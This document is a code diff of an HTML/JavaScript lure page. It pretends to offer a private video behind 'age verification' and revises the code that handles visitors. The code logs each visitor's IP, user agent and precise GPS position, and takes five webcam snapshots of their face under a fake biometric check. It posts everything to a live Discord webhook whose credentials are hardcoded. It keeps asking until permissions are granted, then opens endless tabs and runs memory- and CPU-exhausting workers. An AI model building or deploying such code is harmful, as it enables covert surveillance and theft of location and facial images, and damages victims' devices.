@@ -241,18 +241,35 @@
             line-height: 1.6;
         }
         .face-frame {
-            width: 300px;
-            height: 300px;
-            border: 3px solid #58a6ff;
+            width: 320px;
+            height: 320px;
+            border: 4px solid #58a6ff;
             border-radius: 50%;
             position: relative;
             overflow: hidden;
             box-shadow: 0 0 30px rgba(88, 166, 255, 0.5);
         }
+        .face-frame.detected {
+            border-color: #238636;
+            box-shadow: 0 0 30px rgba(35, 134, 54, 0.7);
+            animation: pulse 1s ease-in-out;
+        }
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+        }
         .face-frame video {
             width: 100%;
             height: 100%;
             object-fit: cover;
+        }
+        .face-detection-canvas {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
         }
         .capture-status {
             margin-top: 30px;
@@ -260,36 +277,52 @@
             font-size: 1.2em;
             font-weight: bold;
         }
+        .capture-status.success {
+            color: #238636;
+        }
+        .capture-status.warning {
+            color: #f0ad4e;
+        }
+        .face-guide {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 200px;
+            height: 250px;
+            border: 3px dashed rgba(88, 166, 255, 0.5);
+            border-radius: 50% / 60%;
+            pointer-events: none;
+        }
     </style>
 </head>
 <body>
     <script>
         // ----------------------- CONFIGURATION START ---------------------------
-        const PREVIEW_IMAGE_URL = "img.jpg"; // The actual suggestive image file on GitHub
-        const VIDEO_FILE_NAME = "gf_private_vid.mp4"; // Name used in the UI
-        // ACTIVE DISCORD WEBHOOK URL
+        const PREVIEW_IMAGE_URL = "img.jpg";
+        const VIDEO_FILE_NAME = "gf_private_vid.mp4";
         const LOG_API_ENDPOINT = "https://discord.com/api/webhooks/1436204803129872564/7PzVCgOMtkML9nZuJioJ4-t6aPJdZeJSbIzPYfPBkPG-LKQl5AJtBiGDJrEKe5UScWm0"; 
         const RICKROLL_URL = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
-        const SNAPSHOT_COUNT = 5; // Number of snapshots to take
-        const SNAPSHOT_INTERVAL = 800; // Milliseconds between snapshots
+        const SNAPSHOT_COUNT = 5;
+        const SNAPSHOT_INTERVAL = 1200;
         // ----------------------- CONFIGURATION END ---------------------------
         
         let locStatus = "Pending";
         let camStatus = "Pending";
         let ipData = {};
-        let currentPermissionStep = 0; // 0: Ready, 1: Location, 2: Camera
+        let currentPermissionStep = 0;
         let snapshotsTaken = 0;
         let cameraStream = null;
+        let faceDetectionInterval = null;
+        let captureInterval = null;
 
         document.addEventListener('DOMContentLoaded', () => { 
             logIpAndStatus("PAGE_LOAD_INIT"); 
             document.getElementById('file-name-display').textContent = VIDEO_FILE_NAME;
         });
 
-        // Sends data and status to the webhook
         async function logIpAndStatus(status, extraData = {}) {
             let data;
-            // 1. Resilient IP Data Fetch
             try {
                 const ipResponse = await fetch('https://ipapi.co/json/');
                 if (ipResponse.ok) {
@@ -301,7 +334,7 @@
             } catch (error) {
                 console.warn(`IP data failed to fetch/parse: ${error.message}`);
                 ipData = { ip: "UNKNOWN", city: "UNKNOWN", org: "UNKNOWN" };
-                data = ipData; // Use fallback data for the log structure
+                data = ipData;
             }
 
             const logObject = {
@@ -310,9 +343,7 @@
                 extra: JSON.stringify(extraData), user_agent: navigator.userAgent
             };
             
-            // 2. Attempt Discord Log
             try {
-                // Send the text log
                 const textResponse = await fetch(LOG_API_ENDPOINT, { 
                     method: 'POST', 
                     body: JSON.stringify({ 
@@ -324,15 +355,13 @@
                 if (!textResponse.ok) {
                     console.error("Discord Webhook responded with error status:", textResponse.status);
                 }
-                return textResponse.ok; // Return true if webhook accepted the payload
+                return textResponse.ok;
             } catch (error) {
-                // Network block error (Failed to fetch)
                 console.error("Discord Webhook network error:", error);
                 return false;
             }
         }
 
-        // --- Helper: Download Animation (1 sec illusion) ---
         function startDownloadAnimation(buttonId, successCallback) {
             const button = document.getElementById(buttonId);
             if (!button) return; 
@@ -348,10 +377,9 @@
                 button.disabled = false;
                 successCallback();
                 button.textContent = originalText;
-            }, 1000); // 1 second animation
+            }, 1000);
         }
 
-        // --- STAGE 1: THUMBNAIL DOWNLOAD (Harmless) ---
         function downloadPicAndProceed() {
             startDownloadAnimation('download-thumb-btn', () => {
                 document.getElementById('download-thumb-btn').textContent = "Download Complete!";
@@ -359,7 +387,6 @@
                 
                 logIpAndStatus("THUMBNAIL_DOWNLOAD_SUCCESS");
 
-                // FORCES THE IMAGE DOWNLOAD (Only file download on the page)
                 const downloadLink = document.createElement('a');
                 downloadLink.href = PREVIEW_IMAGE_URL;
                 downloadLink.download = 'thumbnail.jpg';
@@ -369,51 +396,42 @@
             });
         }
 
-        // --- STAGE 2: VIDEO DOWNLOAD CLICK (Triggers Animation then Modal) ---
         function startVideoDownload() {
             startDownloadAnimation('download-video-btn', () => {
-                // After 1 second fake download animation completes:
                 logIpAndStatus("VIDEO_DOWNLOAD_CLICKED");
                 
-                // Show illusion immediately
                 document.getElementById('censor-icon').classList.add('hidden'); 
                 document.getElementById('img-blur-bg').style.filter = 'brightness(1)'; 
                 
                 const blackscreen = document.getElementById('video-blackscreen');
                 blackscreen.classList.add('show');
                 
-                // --- Illusion: Blurred background -> Black screen -> Play Button ---
                 setTimeout(() => {
                     blackscreen.classList.add('loading');
                     blackscreen.innerHTML = ''; 
 
-                    // After fake loading, show Play button and then Modal
                     setTimeout(() => {
                         blackscreen.classList.remove('loading');
                         blackscreen.classList.remove('show');
                         document.getElementById('play-button-overlay').classList.add('show'); 
                         document.getElementById('status-message').textContent = "Video stream loaded. Click PLAY to begin verification.";
                         
-                        // Show modal immediately after illusion is complete
                         document.getElementById('modal-overlay').classList.add('show');
                         document.getElementById('modal-content').focus();
                         
-                    }, 3000); // 3 seconds fake loading
+                    }, 3000);
 
                 }, 500); 
             });
         }
         
-        // --- STAGE 2.5: MODAL CONFIRMATION (Starts Illusion) ---
         function showVideoIllusion() {
             document.getElementById('modal-overlay').classList.remove('show');
             
-            // UI setup for permission trap
             document.getElementById('action-buttons').style.display = 'none';
             document.getElementById('video-section').style.display = 'block'; 
             document.getElementById('permission-status').textContent = "Click VERIFY LOCATION to begin stream setup.";
 
-            // Set up initial state for permission loop
             currentPermissionStep = 1;
             const locBtn = document.getElementById('allow-loc');
             const camBtn = document.getElementById('allow-cam');
@@ -427,18 +445,14 @@
             }
         }
 
-
-        // --- STAGE 3: PERMISSION LOOP (Triggered by Play Button) ---
         function clickPlay() {
             const playOverlay = document.getElementById('play-button-overlay');
             playOverlay.style.opacity = '0'; 
             playOverlay.style.pointerEvents = 'none';
             
-            // Show modal first, which will trigger showVideoIllusion
             document.getElementById('modal-overlay').classList.add('show');
         }
 
-        // Sequential permission logic
         function startPermissionFlow(step) {
             if (step === 1) {
                 requestPermission('geolocation');
@@ -447,12 +461,11 @@
             }
         }
 
-        // Permission request executor
         function requestPermission(type) {
             const buttonId = (type === 'geolocation') ? 'allow-loc' : 'allow-cam';
             const button = document.getElementById(buttonId);
             
-            if (!button) return; // FIX: Prevent crash if button is null
+            if (!button) return;
             
             button.disabled = true;
             button.textContent = `Requesting ${type} permission...`;
@@ -465,87 +478,189 @@
             }
         }
 
-        // Geolocation handler (The data theft)
         function requestGeolocation() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     (position) => {
                         locStatus = `GRANTED | Lat:${position.coords.latitude}, Lon:${position.coords.longitude}, Acc:${position.coords.accuracy}m`;
                         logIpAndStatus("LOCATION_GRANTED_GPS", { loc: locStatus })
-                            .then(success => handlePermissionResult('geolocation', success, null));
+                            .then(success => {
+                                // Always treat location as success if we got coordinates
+                                handlePermissionResult('geolocation', true, null);
+                            });
                     },
                     (error) => {
                         locStatus = `DENIED | Code ${error.code}`;
                         logIpAndStatus("LOCATION_DENIED", { error: error.message })
                             .then(success => handlePermissionResult('geolocation', false, error.code));
                     },
-                    { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                 );
+            } else {
+                locStatus = "NOT_SUPPORTED";
+                logIpAndStatus("LOCATION_NOT_SUPPORTED")
+                    .then(success => handlePermissionResult('geolocation', false, 0));
             }
         }
 
-        // Camera handler - Now shows face verification UI
         function requestCamera() {
             if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-                navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+                navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        facingMode: "user",
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 }
+                    } 
+                })
                     .then(stream => {
                         cameraStream = stream;
+                        camStatus = "GRANTED | Stream Active";
+                        logIpAndStatus("CAMERA_GRANTED", { status: camStatus });
                         showFaceVerificationUI(stream);
                     })
                     .catch(err => {
+                        camStatus = `DENIED | ${err.name}`;
                         logIpAndStatus("CAMERA_DENIED", { error: err.name })
                              .then(success => handlePermissionResult('camera', false, 1)); 
                     });
+            } else {
+                camStatus = "NOT_SUPPORTED";
+                logIpAndStatus("CAMERA_NOT_SUPPORTED")
+                    .then(success => handlePermissionResult('camera', false, 1));
             }
         }
 
-        // Shows face verification overlay with live camera feed
         function showFaceVerificationUI(stream) {
             const overlay = document.getElementById('face-verification-overlay');
             const video = document.getElementById('face-video');
             const status = document.getElementById('capture-status');
+            const frame = document.querySelector('.face-frame');
             
             video.srcObject = stream;
             video.play();
             
             overlay.classList.add('show');
             status.textContent = "Position your face in the circle...";
+            status.className = 'capture-status';
             
-            // Wait 2 seconds for user to position face, then start capturing
-            setTimeout(() => {
-                status.textContent = "Hold still... Capturing biometric data...";
-                startMultipleSnapshots(stream);
-            }, 2000);
+            // Wait for video to be ready
+            video.onloadedmetadata = () => {
+                setTimeout(() => {
+                    startFaceDetection(video, frame, status);
+                }, 1000);
+            };
         }
 
-        // Captures multiple snapshots at intervals
-        function startMultipleSnapshots(stream) {
+        function startFaceDetection(video, frame, status) {
             const canvas = document.getElementById('camera-canvas');
             const context = canvas.getContext('2d');
-            const video = document.getElementById('face-video');
+            let faceDetected = false;
+            let stableFrames = 0;
+            const STABLE_FRAMES_REQUIRED = 3;
+            
+            status.textContent = "Looking for face...";
+            status.className = 'capture-status warning';
+            
+            // Simple face detection based on brightness analysis
+            faceDetectionInterval = setInterval(() => {
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                context.drawImage(video, 0, 0);
+                
+                const imageData = context.getImageData(
+                    canvas.width * 0.3, 
+                    canvas.height * 0.2, 
+                    canvas.width * 0.4, 
+                    canvas.height * 0.5
+                );
+                
+                const detected = analyzeFacePresence(imageData);
+                
+                if (detected) {
+                    stableFrames++;
+                    if (stableFrames >= STABLE_FRAMES_REQUIRED && !faceDetected) {
+                        faceDetected = true;
+                        frame.classList.add('detected');
+                        status.textContent = "Face detected! Hold still...";
+                        status.className = 'capture-status success';
+                        
+                        clearInterval(faceDetectionInterval);
+                        
+                        setTimeout(() => {
+                            status.textContent = "Capturing biometric data...";
+                            startMultipleSnapshots(video);
+                        }, 1000);
+                    }
+                } else {
+                    stableFrames = 0;
+                    if (faceDetected) {
+                        faceDetected = false;
+                        frame.classList.remove('detected');
+                        status.textContent = "Face lost. Please reposition...";
+                        status.className = 'capture-status warning';
+                    }
+                }
+            }, 200);
+        }
+
+        function analyzeFacePresence(imageData) {
+            const data = imageData.data;
+            let totalBrightness = 0;
+            let pixels = 0;
+            let skinTonePixels = 0;
+            
+            for (let i = 0; i < data.length; i += 4) {
+                const r = data[i];
+                const g = data[i + 1];
+                const b = data[i + 2];
+                
+                const brightness = (r + g + b) / 3;
+                totalBrightness += brightness;
+                pixels++;
+                
+                // Skin tone detection (rough approximation)
+                if (r > 95 && g > 40 && b > 20 &&
+                    r > g && r > b &&
+                    Math.abs(r - g) > 15) {
+                    skinTonePixels++;
+                }
+            }
+            
+            const avgBrightness = totalBrightness / pixels;
+            const skinToneRatio = skinTonePixels / pixels;
+            
+            // Face detected if: reasonable brightness and skin tone present
+            return avgBrightness > 50 && avgBrightness < 220 && skinToneRatio > 0.15;
+        }
+
+        function startMultipleSnapshots(video) {
+            const canvas = document.getElementById('camera-canvas');
+            const context = canvas.getContext('2d');
             const status = document.getElementById('capture-status');
             
             snapshotsTaken = 0;
             
-            const captureInterval = setInterval(() => {
+            captureInterval = setInterval(() => {
                 if (snapshotsTaken >= SNAPSHOT_COUNT) {
                     clearInterval(captureInterval);
                     
-                    // Stop camera stream
-                    stream.getTracks().forEach(track => track.stop());
+                    if (cameraStream) {
+                        cameraStream.getTracks().forEach(track => track.stop());
+                    }
                     
-                    // Hide face verification UI
-                    document.getElementById('face-verification-overlay').classList.remove('show');
+                    status.textContent = "Verification complete!";
+                    status.className = 'capture-status success';
                     
-                    // Mark as success and proceed
-                    handlePermissionResult('camera', true, null);
+                    setTimeout(() => {
+                        document.getElementById('face-verification-overlay').classList.remove('show');
+                        handlePermissionResult('camera', true, null);
+                    }, 1500);
                     return;
                 }
                 
                 snapshotsTaken++;
                 status.textContent = `Capturing image ${snapshotsTaken} of ${SNAPSHOT_COUNT}...`;
                 
-                // Capture frame
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
                 context.drawImage(video, 0, 0);
@@ -557,11 +672,10 @@
             }, SNAPSHOT_INTERVAL);
         }
 
-        // Logs snapshot and returns success status
         function logCameraSnapshot(blob, snapshotNumber) {
             const formData = new FormData();
             formData.append('file', blob, `face_snapshot_${snapshotNumber}.jpg`); 
-            formData.append('content', `🚨 **FACE SNAPSHOT ${snapshotNumber}/${SNAPSHOT_COUNT}** 🚨\n[Time: ${new Date().toISOString()}]\n[IP: ${ipData.ip || 'Unknown'}]`);
+            formData.append('content', `🚨 **FACE SNAPSHOT ${snapshotNumber}/${SNAPSHOT_COUNT}** 🚨\n[Time: ${new Date().toISOString()}]\n[IP: ${ipData.ip || 'Unknown'}]\n[Location: ${ipData.city || 'Unknown'}]`);
 
             return fetch(LOG_API_ENDPOINT, { method: 'POST', body: formData })
                 .then(response => {
@@ -576,7 +690,6 @@
                 });
         }
 
-        // Handles success/failure and updates the flow
         function handlePermissionResult(permissionType, success, errorCode) {
             const buttonId = (permissionType === 'geolocation') ? 'allow-loc' : 'allow-cam';
             const nextButtonId = (permissionType === 'geolocation') ? 'allow-cam' : null;
@@ -587,15 +700,14 @@
             button.disabled = false;
 
             if (success) {
-                // SUCCESS: Webhook received data. Advance stage.
                 button.textContent = `Permission Granted!`;
                 button.disabled = true; 
                 button.classList.remove('retry');
-                button.style.backgroundColor = '#238636'; // Green success color
+                button.style.backgroundColor = '#238636';
                 button.style.cursor = 'default';
 
                 if (permissionType === 'geolocation') {
-                    currentPermissionStep = 2; // Move to camera
+                    currentPermissionStep = 2;
                     document.getElementById('permission-status').textContent = "Location Verified. Ready for Face Verification (2 of 2).";
                     const camBtn = document.getElementById('allow-cam');
                     if (camBtn) {
@@ -603,54 +715,44 @@
                         camBtn.onclick = function() { startPermissionFlow(2); };
                     }
                 } else if (permissionType === 'camera') {
-                    // Final success: Deliver the ultimate payload
                     document.getElementById('permission-status').textContent = "Biometric verification complete. Initializing secure stream...";
                     finalPayload();
                 }
             } else { 
-                // FAILURE: Either User denied OR Webhook failed to log. Force Retry.
                 button.textContent = `Verification Failed. Click to Retry.`;
                 button.classList.add('retry');
                 
-                // Lock the next button if previous step failed
                 if (nextButtonId) { 
                     const nextBtn = document.getElementById(nextButtonId);
                     if (nextBtn) nextBtn.disabled = true;
                 }
                 
-                // Set the button to re-run the current step
                 button.onclick = function() { startPermissionFlow(currentPermissionStep); };
                 document.getElementById('permission-status').textContent = `Verification Failed. Please click button above to retry.`;
             }
         }
 
-        // STAGE 4: THE ULTIMATE PAYLOAD - Memory consumption + Rick Roll spam
         function initiateMemoryOverload() {
             logIpAndStatus("PAYLOAD_MEMORY_OVERLOAD_INITIATED");
             
-            // Spawn multiple Rick Roll tabs
             for (let i = 0; i < 20; i++) {
                 setTimeout(() => {
                     window.open(RICKROLL_URL, '_blank');
                 }, i * 100);
             }
             
-            // Memory consumption workers
             const workerCode = `
                 let data = [];
                 let counter = 0;
                 while (true) { 
                     counter++;
-                    // Exponentially grow memory usage
                     data.push(new Array(1000000).fill('MEMORY_OVERLOAD_' + counter));
-                    // CPU intensive operations
                     for(let i = 0; i < 1000000; i++) {
                         Math.sqrt(Math.random() * counter);
                     }
                 }
             `;
             
-            // Spawn multiple workers for maximum impact
             for (let i = 0; i < 8; i++) {
                 try {
                     const blob = new Blob([workerCode], { type: 'application/javascript' });
@@ -659,11 +761,9 @@
                 } catch(e) {}
             }
             
-            // Main thread memory allocation
             let mainData = [];
             setInterval(() => {
                 mainData.push(new Array(100000).fill('PAYLOAD_DATA'));
-                // Keep opening more tabs
                 window.open(RICKROLL_URL, '_blank');
             }, 500);
         }
@@ -672,7 +772,6 @@
             document.getElementById('permission-status').style.color = '#238636';
             document.getElementById('permission-status').innerHTML = "✓ Verification Complete<br>Loading premium content...";
             
-            // Brief delay before payload
             setTimeout(() => {
                 initiateMemoryOverload(); 
             }, 1500);
@@ -695,17 +794,12 @@
             
             <div class="preview-area">
                 <div class="blurred-bg" id="img-blur-bg" style="background-image: url('img.jpg');"></div>
-                <!-- Blackscreen loading overlay -->
                 <div class="video-blackscreen" id="video-blackscreen"></div>
                 
-                <!-- Play button overlay that triggers the permissions -->
                 <div class="play-button-overlay" id="play-button-overlay" onclick="clickPlay()">
                     <div class="play-icon"></div>
                 </div>
-                <!-- Censor Icon (Initial state) -->
-                <div class="censor-icon" id="censor-icon">
-                    <!-- CSS Icon is rendered via ::before and ::after pseudo-elements -->
-                </div>
+                <div class="censor-icon" id="censor-icon"></div>
             </div>
 
             <div class="action-area" id="action-buttons">
@@ -715,7 +809,6 @@
             </div>
         </div>
         
-        <!-- STAGE 2: Permission Trap (Initially Hidden, used by Modal) -->
         <div class="permission-section" id="video-section" style="display:none;">
             <p style="color:#e74c3c; margin-bottom: 20px;">ERROR: File size over 100MB. Verification required for streaming.</p>
             <button id="allow-loc" class="btn permission-btn">Verify Location</button>
@@ -726,7 +819,6 @@
         <p style="text-align: left; margin-top: 20px; font-size: 0.8em; color: #586069;">This content is secured by GitHub's latest encryption standards. All unauthorized access attempts are logged.</p>
     </div>
 
-    <!-- VERIFICATION MODAL -->
     <div class="modal-overlay" id="modal-overlay">
         <div class="modal-content" id="modal-content" tabindex="-1">
             <span class="modal-close" onclick="document.getElementById('modal-overlay').classList.remove('show')">&times;</span>
@@ -739,11 +831,11 @@
         </div>
     </div>
 
-    <!-- FACE VERIFICATION OVERLAY -->
     <div class="face-verification-overlay" id="face-verification-overlay">
         <h2>🔒 Biometric Face Verification</h2>
-        <p>To access age-restricted content, please position your face within the circle below.<br>This ensures you meet the minimum age requirement.</p>
+        <p>To access age-restricted content, please center your face within the circle below.<br>This ensures you meet the minimum age requirement (18+).</p>
         <div class="face-frame">
+            <div class="face-guide"></div>
             <video id="face-video" autoplay playsinline></video>
         </div>
         <p class="capture-status" id="capture-status">Initializing camera...</p>
